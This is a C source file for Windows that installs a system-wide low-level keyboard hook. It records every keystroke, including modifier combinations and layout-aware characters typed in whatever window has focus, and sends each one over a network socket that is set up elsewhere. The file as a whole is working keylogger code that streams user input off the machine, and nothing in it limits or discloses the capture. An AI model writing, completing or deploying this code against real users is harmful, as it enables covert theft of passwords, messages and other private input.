#include "keyboard.h"

static BOOL pendingCtrl = FALSE;
static BOOL comboUsed = FALSE;
static BOOL keyStateTracker[256] = { FALSE };

BOOL IsModifierKey(DWORD vkCode) {
	return (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
		vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
		vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
		vkCode == VK_LWIN || vkCode == VK_RWIN);
}

void GetKeyNameCustom(DWORD vkCode, char *buffer, size_t bufferSize) {
	switch (vkCode) {
	case VK_RETURN:   strcpy_s(buffer, bufferSize, "ENTER"); return;
	case VK_BACK:     strcpy_s(buffer, bufferSize, "BACKSPACE"); return;
	case VK_TAB:      strcpy_s(buffer, bufferSize, "TAB"); return;
	case VK_ESCAPE:   strcpy_s(buffer, bufferSize, "ESC"); return;
	case VK_SPACE:    strcpy_s(buffer, bufferSize, "SPACE"); return;
	case VK_DELETE:   strcpy_s(buffer, bufferSize, "DEL"); return;
	case VK_INSERT:   strcpy_s(buffer, bufferSize, "INSERT"); return;
	case VK_HOME:     strcpy_s(buffer, bufferSize, "HOME"); return;
	case VK_END:      strcpy_s(buffer, bufferSize, "END"); return;
	case VK_PRIOR:    strcpy_s(buffer, bufferSize, "PAGEUP"); return;
	case VK_NEXT:     strcpy_s(buffer, bufferSize, "PAGEDOWN"); return;
	case VK_LEFT:     strcpy_s(buffer, bufferSize, "LEFT"); return;
	case VK_UP:       strcpy_s(buffer, bufferSize, "UP"); return;
	case VK_RIGHT:    strcpy_s(buffer, bufferSize, "RIGHT"); return;
	case VK_DOWN:     strcpy_s(buffer, bufferSize, "DOWN"); return;
	case VK_CAPITAL:  strcpy_s(buffer, bufferSize, "CAPSLOCK"); return;
	case VK_NUMLOCK:  strcpy_s(buffer, bufferSize, "NUMLOCK"); return;
	case VK_SCROLL:   strcpy_s(buffer, bufferSize, "SCROLLLOCK"); return;
	case VK_SNAPSHOT: strcpy_s(buffer, bufferSize, "PRINTSCREEN"); return;
	case VK_PAUSE:    strcpy_s(buffer, bufferSize, "PAUSE"); return;
	case VK_APPS:     strcpy_s(buffer, bufferSize, "MENU_KEY"); return;

	case VK_VOLUME_MUTE:      strcpy_s(buffer, bufferSize, "MUTE"); return;
	case VK_VOLUME_DOWN:      strcpy_s(buffer, bufferSize, "VOL_DOWN"); return;
	case VK_VOLUME_UP:        strcpy_s(buffer, bufferSize, "VOL_UP"); return;
	case VK_MEDIA_NEXT_TRACK: strcpy_s(buffer, bufferSize, "NEXT_TRACK"); return;
	case VK_MEDIA_PREV_TRACK: strcpy_s(buffer, bufferSize, "PREV_TRACK"); return;
	case VK_MEDIA_STOP:       strcpy_s(buffer, bufferSize, "MEDIA_STOP"); return;
	case VK_MEDIA_PLAY_PAUSE: strcpy_s(buffer, bufferSize, "PLAY_PAUSE"); return;

	case VK_F1:  strcpy_s(buffer, bufferSize, "F1"); return;
	case VK_F2:  strcpy_s(buffer, bufferSize, "F2"); return;
	case VK_F3:  strcpy_s(buffer, bufferSize, "F3"); return;
	case VK_F4:  strcpy_s(buffer, bufferSize, "F4"); return;
	case VK_F5:  strcpy_s(buffer, bufferSize, "F5"); return;
	case VK_F6:  strcpy_s(buffer, bufferSize, "F6"); return;
	case VK_F7:  strcpy_s(buffer, bufferSize, "F7"); return;
	case VK_F8:  strcpy_s(buffer, bufferSize, "F8"); return;
	case VK_F9:  strcpy_s(buffer, bufferSize, "F9"); return;
	case VK_F10: strcpy_s(buffer, bufferSize, "F10"); return;
	case VK_F11: strcpy_s(buffer, bufferSize, "F11"); return;
	case VK_F12: strcpy_s(buffer, bufferSize, "F12"); return;

	case VK_NUMPAD0: strcpy_s(buffer, bufferSize, "NUM0"); return;
	case VK_NUMPAD1: strcpy_s(buffer, bufferSize, "NUM1"); return;
	case VK_NUMPAD2: strcpy_s(buffer, bufferSize, "NUM2"); return;
	case VK_NUMPAD3: strcpy_s(buffer, bufferSize, "NUM3"); return;
	case VK_NUMPAD4: strcpy_s(buffer, bufferSize, "NUM4"); return;
	case VK_NUMPAD5: strcpy_s(buffer, bufferSize, "NUM5"); return;
	case VK_NUMPAD6: strcpy_s(buffer, bufferSize, "NUM6"); return;
	case VK_NUMPAD7: strcpy_s(buffer, bufferSize, "NUM7"); return;
	case VK_NUMPAD8: strcpy_s(buffer, bufferSize, "NUM8"); return;
	case VK_NUMPAD9: strcpy_s(buffer, bufferSize, "NUM9"); return;
	case VK_MULTIPLY: strcpy_s(buffer, bufferSize, "NUM*"); return;
	case VK_ADD:      strcpy_s(buffer, bufferSize, "NUM+"); return;
	case VK_SUBTRACT: strcpy_s(buffer, bufferSize, "NUM-"); return;
	case VK_DECIMAL:  strcpy_s(buffer, bufferSize, "NUM."); return;
	case VK_DIVIDE:   strcpy_s(buffer, bufferSize, "NUM/"); return;
	}

	if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
		buffer[0] = (char)vkCode;
		buffer[1] = '\0';
		return;
	}

	UINT ch = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
	if (ch != 0) {
		buffer[0] = (char)ch;
		buffer[1] = '\0';
		return;
	}

	sprintf_s(buffer, bufferSize, "0x%02X", vkCode);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
		DWORD vkCode = kbdStruct->vkCode;
		DWORD scanCode = kbdStruct->scanCode;

		if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
			if (vkCode < 256) keyStateTracker[vkCode] = FALSE;

			if (pendingCtrl && (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL)) {
				wprintf(L"Sent: [CTRL]\n");
				fflush(stdout);
				send(sock, "[CTRL]", 6, 0);
				pendingCtrl = FALSE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			if (IsModifierKey(vkCode)) {
				if (!comboUsed) {
					const char *modName = NULL;
					if (vkCode == VK_LMENU || vkCode == VK_MENU) modName = "[ALT]";
					else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT || vkCode == VK_SHIFT) modName = "[SHIFT]";
					else if (vkCode == VK_LWIN || vkCode == VK_RWIN) modName = "[WIN]";
					else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL) modName = "[CTRL]";

					if (modName != NULL) {
						wprintf(L"Sent: %hs\n", modName);
						fflush(stdout);
						send(sock, modName, (int)strlen(modName), 0);
					}
				}

				BOOL isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
				BOOL isAlt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
				BOOL isShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
				BOOL isWin = ((GetAsyncKeyState(VK_LWIN) & 0x8000) != 0) || ((GetAsyncKeyState(VK_RWIN) & 0x8000) != 0);

				if (!isCtrl && !isAlt && !isShift && !isWin) {
					comboUsed = FALSE;
				}
			}
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}

		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

			if (vkCode < 256 && keyStateTracker[vkCode]) {
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
			if (vkCode < 256) keyStateTracker[vkCode] = TRUE;

			if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL || vkCode == VK_CONTROL) {
				pendingCtrl = TRUE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			BOOL isAltGrKey = (vkCode == VK_RMENU) ||
				((vkCode == VK_MENU) && (kbdStruct->flags & LLKHF_EXTENDED));

			if (pendingCtrl) {
				if (isAltGrKey) {
					pendingCtrl = FALSE;
				}
				else {
					pendingCtrl = FALSE;
				}
			}

			if (isAltGrKey) {
				wprintf(L"Sent: [ALTGR]\n");
				fflush(stdout);
				send(sock, "[ALTGR]", 7, 0);
				comboUsed = TRUE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			if (IsModifierKey(vkCode)) {
				comboUsed = FALSE;
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}

			BOOL isAltGrPressed = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0 ||
				((kbdStruct->flags & LLKHF_EXTENDED) && (GetAsyncKeyState(VK_MENU) & 0x8000));

			BOOL isCtrlPressed = ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) && !isAltGrPressed;
			BOOL isAltPressed = ((GetAsyncKeyState(VK_MENU) & 0x8000) != 0) && !isAltGrPressed;
			BOOL isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
			BOOL isWinPressed = ((GetAsyncKeyState(VK_LWIN) & 0x8000) != 0) || ((GetAsyncKeyState(VK_RWIN) & 0x8000) != 0);

			BOOL hasShortcutModifier = (isCtrlPressed || isAltPressed || isWinPressed);

			BYTE keyboardState[256];
			GetKeyboardState(keyboardState);
			keyboardState[VK_SHIFT] = isShiftPressed ? 0x80 : 0;
			keyboardState[VK_CONTROL] = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
			keyboardState[VK_MENU] = (GetAsyncKeyState(VK_MENU) & 0x8000) ? 0x80 : 0;
			keyboardState[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 0x0001);

			HWND foreground = GetForegroundWindow();
			DWORD threadId = GetWindowThreadProcessId(foreground, NULL);
			HKL layout = GetKeyboardLayout(threadId);

			wchar_t unicodeBuf[8] = { 0 };
			int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuf, 8, 0, layout);

			if (!hasShortcutModifier && result > 0 && unicodeBuf[0] >= 32) {
				wprintf(L"Sent: %.*ls\n", result, unicodeBuf);
				fflush(stdout);

				char utf8Buf[32] = { 0 };
				int utf8Len = WideCharToMultiByte(CP_UTF8, 0, unicodeBuf, result, utf8Buf, sizeof(utf8Buf), NULL, NULL);

				if (utf8Len > 0) {
					send(sock, utf8Buf, utf8Len, 0);
				}
				comboUsed = TRUE;
			}
			else {
				comboUsed = TRUE;

				char comboBuf[64] = { 0 };
				char keyName[32] = { 0 };
				GetKeyNameCustom(vkCode, keyName, sizeof(keyName));

				if (hasShortcutModifier) {
					strcat_s(comboBuf, sizeof(comboBuf), "[");
					if (isCtrlPressed)  strcat_s(comboBuf, sizeof(comboBuf), "CTRL+");
					if (isAltPressed)   strcat_s(comboBuf, sizeof(comboBuf), "ALT+");
					if (isWinPressed)   strcat_s(comboBuf, sizeof(comboBuf), "WIN+");
					if (isShiftPressed) strcat_s(comboBuf, sizeof(comboBuf), "SHIFT+");

					strcat_s(comboBuf, sizeof(comboBuf), keyName);
					strcat_s(comboBuf, sizeof(comboBuf), "]");
				}
				else {
					sprintf_s(comboBuf, sizeof(comboBuf), "[%s]", keyName);
				}

				wprintf(L"Sent: %hs\n", comboBuf);
				fflush(stdout);

				send(sock, comboBuf, (int)strlen(comboBuf), 0);
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

HHOOK hook_the_keyboard() {
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
	if (!hook) {
		fwprintf(stderr, L"Hook could not be set up: %lu\n", GetLastError());
		return NULL;
	}
	return hook;
}